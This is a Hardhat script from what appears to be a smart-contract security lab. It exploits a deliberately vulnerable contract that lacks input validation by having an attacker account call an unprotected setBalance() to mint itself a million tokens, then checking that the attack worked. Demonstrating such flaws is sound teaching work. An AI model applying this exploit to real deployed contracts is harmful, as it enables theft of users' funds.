const { ethers } = require("hardhat");
const fs = require("fs");
const path = require("path");

async function main() {
  console.log("🚀 Initiating attack on SC04_LackOfInputValidation_Vulnerable...");

  // --- 1. GET THE SIGNERS ---
  const [deployer, attacker] = await ethers.getSigners();

  console.log(`Deployer Address: ${deployer.address}`);
  console.log(`Attacker Address: ${attacker.address}`);

  // --- 2. GET THE DEPLOYED CONTRACT ---
  const envPath = path.join(__dirname, "..", "frontend", ".env");
  if (!fs.existsSync(envPath)) {
    throw new Error("❌ Could not find the .env file in frontend/. Please deploy contracts first.");
  }
  const envFile = fs.readFileSync(envPath, "utf8");
  const addressMatch = envFile.match(/VITE_SC04_VULNERABLE_ADDRESS='(.*)'/);

  if (!addressMatch) {
    throw new Error("❌ Could not find the vulnerable contract address in frontend/.env. Please deploy contracts first.");
  }
  const vulnerableContractAddress = addressMatch[1];
  console.log(`\n🎯 Target Contract Address: ${vulnerableContractAddress}`);

  const vulnerableContract = await ethers.getContractAt("SC04_LackOfInputValidation_Vulnerable", vulnerableContractAddress);

  // --- 3. EXECUTE THE ATTACK ---
  console.log("\n💰 Checking attacker's balance before the attack...");
  const balanceBefore = await vulnerableContract.balances(attacker.address);
  console.log(`   - Attacker's balance in contract: ${balanceBefore.toString()}`);

  const attackAmount = ethers.parseUnits("1000000", 18); // Give 1,000,000 tokens
  console.log(`\n💥 ATTACKING: Calling the vulnerable setBalance() function to give the attacker ${ethers.formatUnits(attackAmount, 18)} tokens...`);
  
  // The attacker calls setBalance for their own address with a large amount
  const tx = await vulnerableContract.connect(attacker).setBalance(attacker.address, attackAmount);
  await tx.wait();
  console.log("✅ Attack transaction successful!");

  console.log("\n💰 Checking attacker's balance after the attack...");
  const balanceAfter = await vulnerableContract.balances(attacker.address);
  console.log(`   - Attacker's balance in contract: ${balanceAfter.toString()}`);

  if (balanceAfter === attackAmount) {
    console.log("\n🎉 SUCCESS: The attacker has successfully manipulated their balance!");
  } else {
    console.log("\n😞 FAILED: The attacker's balance was not updated as expected.");
  }
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
